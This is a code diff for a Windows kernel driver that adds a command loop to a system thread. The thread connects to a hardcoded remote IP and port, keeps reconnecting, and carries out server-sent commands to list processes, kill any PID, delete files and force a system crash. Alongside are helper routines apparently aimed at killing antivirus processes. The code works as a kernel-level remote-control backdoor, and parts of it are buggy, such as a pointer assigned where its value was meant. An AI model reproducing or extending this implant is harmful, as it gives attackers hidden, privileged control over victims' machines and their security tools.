@@ -24,7 +24,7 @@ VOID InitializeObjectAttributes(
 
 
 
-
+#pragma warning(disable:6066)
 #include "internal.h"
 #include "system.h"
 #include "network.h"
@@ -34,7 +34,9 @@ VOID InitializeObjectAttributes(
 
 PDEVICE_OBJECT g_pCtrlDO = NULL;
 PKTHREAD g_pnThread;
+//This value should be use in the system thread only
 HANDLE die = FALSE;
+PWSK_SOCKET pSocket = NULL;
 
 
 
@@ -48,6 +50,11 @@ NTSTATUS kill360_64();
 NTSTATUS xDelFile3(PCHAR pAsFileName);
 void DriverUnload(PDRIVER_OBJECT pDriverObject) {
 	xLog("DriverUnload Called");
+	die = TRUE;
+	//stop the system thread
+	if (pSocket != NULL){ 
+		CloseSocket(pSocket);
+	}
 	UNICODE_STRING usSymbolName;
 	RtlInitUnicodeString(&usSymbolName, SYMBOLIC_NAME);
 
@@ -65,7 +72,7 @@ void DriverUnload(PDRIVER_OBJECT pDriverObject) {
 	ObDereferenceObject(g_pnThread);
 	xLog("All Released, Closing Log File");
 	//close log file
-	die = TRUE;
+	
 	CloseLogFile();
 }
 
@@ -209,6 +216,64 @@ NTSTATUS DeviceControlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 	return status;
 }
 
+#define NETBUFF_LENGTH 20480
+#define CMD_TASKLIST "ps"
+#define CMD_KILL "kill"
+#define CMD_DEL "del"
+#define CMD_REBOOT "reboot"
+NTSTATUS HandleServerPacket(
+	PCHAR msg,
+	PCHAR pNeedReply
+) {
+	LONG msgLen = strlen(msg);
+	if (msgLen > NETBUFF_LENGTH) {
+		xLog("buffer over flowed");
+		pNeedReply = FALSE;
+		return STATUS_UNSUCCESSFUL;
+	}
+	msg[NETBUFF_LENGTH - 1] = 0;
+	//RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "recv length: %ld\n", msgLen);
+	NTSTATUS status = STATUS_INVALID_PARAMETER;
+	if (strncmp(msg, CMD_TASKLIST, strlen(CMD_TASKLIST)) == 0) {
+		status = tasklist_user(msg, NETBUFF_LENGTH);
+	}
+
+	if (strncmp(msg, CMD_KILL, strlen(CMD_KILL)) == 0) {
+		
+		ANSI_STRING ansipid;
+		RtlInitAnsiString(&ansipid, msg + strlen(CMD_KILL));
+		UNICODE_STRING unipid;
+		RtlAnsiStringToUnicodeString(&unipid, &ansipid, TRUE);
+		DWORD pid;
+		status = RtlUnicodeStringToInt64(&unipid, 0, &pid, NULL);
+		if (NT_SUCCESS(status)) {
+			status = xkill3(pid);
+			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xkill 3 success return %p\n", status);
+		}
+		RtlFreeUnicodeString(&unipid);
+		
+	}
+
+	if (strncmp(msg, CMD_DEL, strlen(CMD_DEL)) == 0) {
+		status = xDelFile3(msg);
+		
+		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xdel 3 return %p\n", status);
+		status = STATUS_SUCCESS;
+	}
+
+	if (strncmp(msg, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
+		//nothing will return
+		KeBugCheck(POWER_FAILURE_SIMULATE);
+	}
+
+	if (!NT_SUCCESS(status)) {
+		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Command Execute Failed: 0x%p\n", status);
+	}
+	
+	*pNeedReply = TRUE;
+}
+
+
 NTSTATUS systemThreadProc() {
 	if (FALSE) {
 		LARGE_INTEGER timeout;
@@ -218,7 +283,7 @@ NTSTATUS systemThreadProc() {
 	}
 	PCHAR msg = (PCHAR)ExAllocatePool2(
 		POOL_FLAG_NON_PAGED,
-		1024,
+		NETBUFF_LENGTH,
 		'netb'
 	);
 	if (msg == NULL) {
@@ -227,7 +292,7 @@ NTSTATUS systemThreadProc() {
 		return *((PNTSTATUS)(NULL));
 	}
 	xLog("System Thread Started");
-	PWSK_SOCKET pSocket;
+	
 	//try to connect to 47.243.50.89
 	//init
 	SOCKADDR_IN remoteAddr = { 0 };
@@ -238,70 +303,120 @@ NTSTATUS systemThreadProc() {
 	remoteAddr.sin_addr.S_un.S_un_b.s_b4 = 89;
 	remoteAddr.sin_port = RtlUshortByteSwap(8777);
 	remoteAddr.sin_family = AF_INET;
-	//connect
-	CONNECT_SOCKET:
 
+	//The values the handler will return
+	CHAR dwNeedReply = FALSE;
+	/**********************************************/
+	//Here is the primary part of the loop
+	//connect
+CONNECT_SOCKET:
+	//First Check if the driver is died, if died, stop the thread
+	if (die) {
+		goto HALT_THREAD;
+	}
+
+	//Then, try to connect to the server, if connect failed, goto thread_failed to check whether need to reconnect
 	NTSTATUS status = ConnectWsk(&pSocket, (PSOCKADDR)&remoteAddr);
 	if (!NT_SUCCESS(status)) {
 		xLog("Connect Failed");
-		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
+		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
 		xLog(msg);
-		goto HALT_THREAD;
+		goto THREAD_FAILED;
 	}
-	//send
-	RtlStringCbPrintfA(msg, 1024, "lolita winsock kernel message: 0x%08X\n", pSocket);
+	//Send 2 hello message to the server, if failed, close socket and wait for reconnect or die
+	RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "lolita winsock kernel message: %p\n", pSocket);
 	status = SendWsk(pSocket, msg, strlen(msg));
 	if (!NT_SUCCESS(status)) {
 		xLog("Send Failed");
-		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
+		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
 		xLog(msg);
 		goto CLOSE_SOCKET;
 	}
 	//send2
-	RtlStringCbPrintfA(msg, 1024, "ExAllocatePool2 return: 0x%08X\n", msg);
+	RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "ExAllocatePool2 return: %p\n", msg);
+	//send back the msg to the server
+SEND_BACK:
+	//any error will goto close and wait
 	status = SendWsk(pSocket, msg, strlen(msg));
 	if (!NT_SUCCESS(status)) {
 		xLog("Send Failed");
-		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
+		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
 		xLog(msg);
 		goto CLOSE_SOCKET;
 	}
-	//recv
+
+RECV_LOOP:
+	//Recieve command from the server, if failed, go to close and die
 	ULONG recvBytes = 0;
-	memset(msg, 0, 1024);
-	status = RecvWsk(pSocket, msg, 1000, &recvBytes);
+	memset(msg, 0, NETBUFF_LENGTH);
+	status = RecvWsk(pSocket, msg, NETBUFF_LENGTH, &recvBytes);
 	if (!NT_SUCCESS(status)) {
 		xLog("Recv Failed");
-		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
+		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
 		xLog(msg);
 		goto CLOSE_SOCKET;
 	}
 	
-	if (recvBytes < 1024ul) {
+	if (recvBytes < NETBUFF_LENGTH) {
 		msg[recvBytes] = 0;
 		xLog("stage debug ok");
 	}
 	else
 	{
-		msg[1000] = 0;
+		msg[NETBUFF_LENGTH - 100] = 0;
 		//recvBytes = strlen(msg);
 	}
 	
 	xLog("recv the following content");
 	xLog(msg);
-	RtlStringCbPrintfA(msg, 1024, "recvBytes: %lu", recvBytes);
-	xLog(msg);
-	//close
-	CLOSE_SOCKET:
+	HandleServerPacket(msg, &dwNeedReply);
+	if (die) {
+		goto CLOSE_SOCKET;
+	}
+	if (dwNeedReply) {
+		dwNeedReply = FALSE;
+		xLog("need reply, content:");
+		xLog(msg);
+		goto SEND_BACK;
+	}
+	else {
+		xLog("not need to reply");
+		goto RECV_LOOP;
+
+	}
+	
+	//RtlStringCbPrintfA(msg, 1024, "recvBytes: %lu", recvBytes);
+	//xLog(msg);
+
+
+
+	//close the socket
+CLOSE_SOCKET:
 	status = CloseSocket(pSocket);
 	if (!NT_SUCCESS(status)) {
 		xLog("Close Failed");
-		RtlStringCbPrintfA(msg, 1024, "status code: 0x%08X", status);
+		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
 		xLog(msg);
 		//ExFreePoolWithTag(msg, 'netb');
 		//PsTerminateSystemThread(STATUS_SUCCESS);
 		//return STATUS_SUCCESS;
 	}
+
+THREAD_FAILED:
+	//sleep 5s
+	LARGE_INTEGER timeout2;
+	timeout2.QuadPart = -10 * 1000 * 1000;
+	timeout2.QuadPart *= 1;
+	for (int i = 0; i < 5; i++) {
+		if (die) {
+			goto HALT_THREAD;
+		}
+		KeDelayExecutionThread(KernelMode, FALSE, &timeout2);
+	}
+	if (die) {
+		goto HALT_THREAD;
+	}
+	goto CONNECT_SOCKET;
 
 HALT_THREAD:
 
